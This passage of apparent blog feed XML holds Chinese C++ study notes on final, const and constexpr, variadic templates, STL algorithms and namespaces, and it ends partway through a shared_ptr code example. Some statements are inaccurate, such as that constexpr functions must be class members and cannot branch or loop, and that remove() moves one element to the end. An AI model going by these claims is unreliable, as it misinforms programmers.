&lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>final</code>关键字的使用</p><ul><li>在类上面的使用</li></ul><p>  类的声明中使用final关键字，可以指示该类不能被继承</p><ul><li><p>在虚函数上面的使用</p><p>在虚函数的声明中使用final关键字，可以阻止子类对该虚函数进行覆盖</p></li></ul><p>需要注意的是，final关键字只能用于类或虚函数的声明中，而不能用于变量、函数或其它类型的声明中。</p></li><li><p><code>const</code>和<code>constexpr</code></p><ul><li><p><code>const</code> 只是将变量标记为“只读”，并非编译期常量，而 <code>constexpr</code> 则需要在编译时求值，生成编译期常量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> constInt=<span class="hljs-number">10</span>;<span class="hljs-comment">//只读</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> constNum=<span class="hljs-number">10</span>;<span class="hljs-comment">//编译期常量</span><br></code></pre></td></tr></table></figure></li><li><p>被声明为 <code>constexpr</code> 的变量或函数，必须要满足编译器的常量表达式要求，可以在编译时进行求值。</p></li><li><p><code>constexpr</code> 变量应该使用特定的类型，如整数类型、枚举类型以及一些简单的浮点类型。</p></li><li><p><code>constexpr</code> 函数具有与普通函数类似的语法，但是其参数和返回值类型也必须是可求值的。在调用 <code>constexpr</code> 函数时，所有参数必须是编译期常量。</p></li></ul></li><li><p><code>const</code>修饰函数</p><p>在C++中，<code>const</code> 关键字可以作用于成员函数、非成员函数、指针和引用等对象上。如果将 <code>const</code> 应用于成员函数，则该函数被视为只读函数（read-only function），即在该函数内不能修改成员变量的值，也不能调用非<code> const</code> 成员函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">fat::test</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-comment">//</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p><code>constexpr</code>修饰函数</p><ol><li>函数必须是类的一部分；</li><li>函数有返回类型，而且返回类型必须为字面值类型；</li><li>函数体中只能包含诸如 <code>return</code>、<code>static_assert</code> 和 <code>typedef</code> 等语句，不能有分支语句（例如 <code>if</code>、<code>while</code>）和循环语句（例如 <code>for</code>、<code>do-while</code>）；</li><li>函数的参数列表中只能有字面值类型、引用和指针，而且参数都必须是 <code>constexpr</code> 的；</li><li>将函数声明为 <code>constexpr</code> 时，函数体内的所有函数调用都必须是 <code>constexpr</code> 的，这也意味着被调用的函数必须是 <code>constexpr</code> 的。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">constexpr</span> <span class="hljs-type">void</span> <span class="hljs-title">fat::test</span><span class="hljs-params">()</span> </span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>void(*)(int,int)</code>和<code>void(int,int)</code>区别</p><p>一个是函数指针，一个是函数</p></li><li><p>显示和隐式转换</p><p>隐式转换和显示转换是类型转换中的两种方式，其中隐式转换是指在代码中转换类型时，不需要明确地指定要进行类型转换，而是根据上下文环境自动进行转换。相反地，显示转换则是指需要明确地在代码中使用强制类型转换的语法来将一种类型转换为另一种类型。</p><p>隐式转换通常是由编译器自动完成的，它允许代码更简洁、更易读和更容易维护。例如，当一个整数值被分配给一个接收实数的变量时，编译器会自动将整数隐式转换为实数。</p><p>与此相反，显示转换则需要在代码中使用强制类型转换的语法（例如“（int）x”）来明确告诉编译器我们要将某个值转换为另一种类型。在有些情况下，显示转换是非常必要的，例如当我们需要将浮点数转换为整数时，需要使用显示转换来避免数据精度丢失。</p></li><li><p>将c++的string转变为c的string</p><p>使用string的<code>c_str()</code>函数</p></li><li><p>在C++中，可以使用std::reverse()函数来翻转一个序列中的元素。该函数定义在<algorithm>头文件中，其语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">BidirectionalIterator</span>&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverse</span> <span class="hljs-params">(BidirectionalIterator first, BidirectionalIterator last)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p><code>find()</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), value);<br></code></pre></td></tr></table></figure></li><li><p>c++的可变列表</p><p>注意头文件<code>&lt;cstdarg&gt;</code></p><p><code>va_list</code>、<code>va_start</code>、<code>va_arg</code>、<code>va_copy</code>和<code>va_end</code>（end是清楚之前的参数列表）等预定义宏</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdarg&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> count,...)</span>-&gt; <span class="hljs-title">decltype</span><span class="hljs-params">(count)</span></span>&#123;<br>    va_list args;<br>    <span class="hljs-built_in">va_start</span>(args,count);<br>    <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br>        sum+= <span class="hljs-built_in">va_arg</span>(args,<span class="hljs-type">int</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">func</span>(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>以下部分代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdarg&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format, ...)</span> </span>&#123;<br>    va_list args;<br>    <span class="hljs-built_in">va_start</span>(args, format);<br><br>    <span class="hljs-keyword">while</span> (*format != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (*format == <span class="hljs-string">&#x27;d&#x27;</span>) &#123;<br>            <span class="hljs-type">int</span> value = <span class="hljs-built_in">va_arg</span>(args, <span class="hljs-type">int</span>);<br>            cout &lt;&lt; value &lt;&lt; endl;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*format == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>            <span class="hljs-type">double</span> value = <span class="hljs-built_in">va_arg</span>(args, <span class="hljs-type">double</span>);<br>            cout &lt;&lt; value &lt;&lt; endl;<br>        &#125;<br>        ++format;<br>    &#125;<br><br>    <span class="hljs-built_in">va_end</span>(args);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-number">123</span>, <span class="hljs-number">3.14</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>可变参数模板</p><ul><li><p>要么重载函数</p><p>要么通过方法，在最后直接返回</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">T <span class="hljs-title">func2</span><span class="hljs-params">(T value)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T,<span class="hljs-keyword">typename</span> ...Args&gt;</span><br><span class="hljs-function">T <span class="hljs-title">func2</span><span class="hljs-params">(T value,Args...args)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> value+ <span class="hljs-built_in">func2</span>(args...);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">func2</span>(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2.3</span>,<span class="hljs-number">4.6</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure></li><li><p>使用<code>auto</code>接纳引用，我们需要手动添加<code>&amp;</code></p></li><li><p>部分现遇的<code>STL</code>算法函数</p><ol><li>查找：find、find_if、find_end、find_first_of、adjacent_find、count、count_if</li><li>排序：sort、stable_sort、partial_sort、nth_element、make_heap、sort_heap</li><li>操作：copy、copy_n、move、swap、swap_ranges、transform、fill、generate、replace、remove、unique、reverse</li><li>数值：accumulate、inner_product、partial_sum、adjacent_difference、iota</li><li>集合操作：set_union、set_intersection、set_difference、merge、includes</li><li>通用算法：for_each、min、max、minmax、clamp、equal、lexicographical_compare、next_permutation、prev_permutation、rotate</li></ol></li><li><p>关于48部分函数的解释</p><ul><li><code>find()</code>查找该值在容器中是否存在</li><li><code>count()</code>计算容器中该<code>value</code>的数量</li><li><code>sort()</code>对容器内的元素排序的函数</li><li><code>copy()</code>对容器的拷贝</li><li><code>transform()</code> 将原来容器的数据导入到现在这个容器当中</li><li><code>fill()</code>它可以将一个容器中的所有元素设置为指定的值</li><li><code>generate()</code>它可以使用指定的函数对象生成容器中的元素。它通常用于初始化容器或将容器重置为特定值</li><li><code>replace()</code> replace函数是C++ STL中的一个函数，它可以将容器中的所有指定值替换为另一个值。它通常用于将容器中的特定元素替换为其他元素。</li><li><code>remove()</code> 选择一个元素移到最后面</li><li><code>unique()</code> 使得只有一个元素</li><li><code>reverse()</code>  它可以将容器中的元素反转。它通常用于反转容器中的元素顺序。</li><li><code>iota()</code> 它可以将指定的值序列填充到容器中。它通常用于初始化容器中的元素。</li><li><code>merge()</code> 它可以将两个已排序的容器合并为一个已排序的容器。它通常用于对已排序的容器进行合并操作。</li><li><code>includes()</code> 它可以判断一个容器是否包含另一个容器中的所有元素。它通常用于判断一个容器是否包含另一个容器。</li><li><code>for_each()</code> 它可以对容器中的每个元素执行指定的操作。它通常用于对容器中的元素进行遍历操作。</li><li><code>rotate</code> 它可以将容器中的元素旋转到指定的位置。它通常用于对容器中的元素进行旋转操作。</li></ul></li><li><p><code>namespace</code></p><ul><li><p>简绍</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/namespace%E7%9A%84%E7%AE%80%E7%BB%8D.jpg"></p></li><li><p>可以嵌套 ，还用<code>inline</code>相当于突破外部 空间的限制</p></li></ul></li><li><p>为什么C语言里卖弄没有重载？</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/%E4%B8%BA%E4%BB%80%E4%B9%88C%E8%AF%AD%E8%A8%80%E9%87%8C%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%87%8D%E8%BD%BD.jpg"></p></li><li><p>指针与引用的不同的</p><p><img src="https://cpp-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B9%B3%E5%B8%B8%E7%AC%94%E8%AE%B0/%E6%8C%87%E9%92%88%E4%B8%8E%E5%BC%95%E7%94%A8%E7%9A%84%E4%B8%8D%E5%90%8C.png"></p></li><li><p>多使用<code>override</code>,<code>final</code>和<code>delete</code>关键字</p></li><li><p>可以在返回值处写<code>auto</code>关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T1,<span class="hljs-keyword">typename</span> T2,<span class="hljs-keyword">typename</span> T3&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(T1 a,T2 b,T3 c)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b+c;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span>  a+b;<br>&#125;<br>    <br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5.8</span>,<span class="hljs-number">-8</span>)&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">-9</span>)&lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>使用可变参数模板进行add操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ...Args&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add</span><span class="hljs-params">(Args...args)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> (args + ...);<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5.8</span>,<span class="hljs-number">-8</span>)&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">-9</span>)&lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>当对<code>vector</code>使用<code>clear</code>后，将不再有<code>vector</code></p></li><li><p><code>.o</code>文件是已经编译完成的文件，这个阶段会发生未声明错误</p><p>如果是未定义，则是发生在链接阶段</p></li><li><p>字符串的初始化有很多形式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    string str1&#123;<span class="hljs-string">&quot;i&#x27;m august&quot;</span>&#125;;<br>    string str2&#123;<span class="hljs-string">&quot;hello,world&quot;</span>,<span class="hljs-number">5</span>&#125;;<br>    string str3&#123;str2,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>&#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能指针</title>
    <link href="/2023/04/11/c++/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    <url>/2023/04/11/c++/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h1><h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h2><h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230315194353315.png" alt="image-20230315194353315"></p><h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myClass</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> tem;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">myClass</span>()&#123;<br>        tem=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">myClass</span>(<span class="hljs-type">int</span> a):<span class="hljs-built_in">tem</span>(a)&#123;&#125;<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//std::shared_ptr的初始化</span><br>    <span class="hljs-comment">//第一种使用以下方法</span><br>    <span class="hljs-type">int</span> *pInt=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sharedPtr</span><span class="hljs-params">(pInt,[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;delete[] pInt1&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr.use_count():&quot;</span>&lt;&lt;sharedPtr.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.1</span><br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title">sharedPtr1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">char</span>)</span></span>;<br>    *sharedPtr1=<span class="hljs-string">&#x27;c&#x27;</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;*sharedPtr1= &quot;</span>&lt;&lt;*sharedPtr1&lt;&lt;std::endl;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr1.use_count():&quot;</span>&lt;&lt;sharedPtr1.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.2</span><br>    <span class="hljs-type">int</span> intSize=<span class="hljs-number">0</span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;intSize:&quot;</span>;<br>    std::cin&gt;&gt;intSize;<br>    <span class="hljs-function">std::shared_ptr&lt;<span class="hljs-type">int</span>[]&gt; <span class="hljs-title">sharedPtr2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[intSize],[](<span class="hljs-type">int</span>* pInt1)&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">        std::cout&lt;&lt;<span class="hljs-string">&quot;this lambda&quot;</span>&lt;&lt;std::endl;</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">delete</span>[] pInt1;</span></span><br><span class="hljs-params"><span class="hljs-function">    &#125;)</span></span>;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2.use_count():&quot;</span>&lt;&lt;sharedPtr2.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<span class="hljs-comment">//输出1</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; intSize; ++i) &#123;<br>        sharedPtr2[i]=i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; intSize; ++i) &#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr2:&quot;</span>&lt;&lt;sharedPtr2[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    std::cout&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.3  //无参构造</span><br>    std::shared_ptr&lt;<span class="hljs-type">char</span>&gt; sharedPtr3;<span class="hljs-comment">//无参构造1</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr3.use_count():&quot;</span>&lt;&lt;sharedPtr3.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br>    <span class="hljs-comment">//1.4 //直接负值</span><br>    sharedPtr3=sharedPtr1;<br><br>    <span class="hljs-comment">//第二种通过拷贝构造和移动构造</span><br>    <span class="hljs-comment">//2.1 //通过move</span><br>    sharedPtr3= std::<span class="hljs-built_in">move</span>(sharedPtr1);<span class="hljs-comment">//通过move实现资源的转移</span><br><br>    <span class="hljs-comment">//第三种 通过make_shared</span><br>    <span class="hljs-comment">//3.1</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: use a fundamental type</span><br><span class="hljs-comment">     */</span><br>    std::shared_ptr&lt;<span class="hljs-type">int</span> &gt; sharedPtr4=std::<span class="hljs-built_in">make_shared</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">520</span>);<span class="hljs-comment">//520是对该堆内存的初始化</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr4:&quot;</span>&lt;&lt;*sharedPtr4&lt;&lt;std::endl;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: use a class</span><br><span class="hljs-comment">     */</span><br><br>    std::shared_ptr&lt;myClass&gt; sharedPtr5= std::<span class="hljs-built_in">make_shared</span>&lt;myClass&gt;(<span class="hljs-number">1314</span>);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    sharedPtr5= std::<span class="hljs-built_in">make_shared</span>&lt;myClass&gt;(<span class="hljs-number">244</span>);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">get</span>()-&gt;tem&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5.use_count():&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt;std::endl;<br><br>    <span class="hljs-comment">//第四种 //reseet()</span><br>    <span class="hljs-comment">//reset的两个功能：1.接触该内存的控制  2.接触该内存的控制，并控制其他的内存</span><br>    <span class="hljs-comment">//4.1 接触控制</span><br>    sharedPtr5.<span class="hljs-built_in">reset</span>();<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5:&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br><br>    sharedPtr2.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>&#125;);<span class="hljs-comment">//注意此处，reset的地址应该和原来管理的一样</span><br>    sharedPtr5.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> myClass&#123;<span class="hljs-number">8989</span>&#125;);<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;sharedPtr5.use_count():&quot;</span>&lt;&lt;sharedPtr5.<span class="hljs-built_in">use_count</span>()&lt;&lt; std::endl;<span class="hljs-comment">//get返回普通变量的指针</span><br>    std::cout&lt;&lt;<span 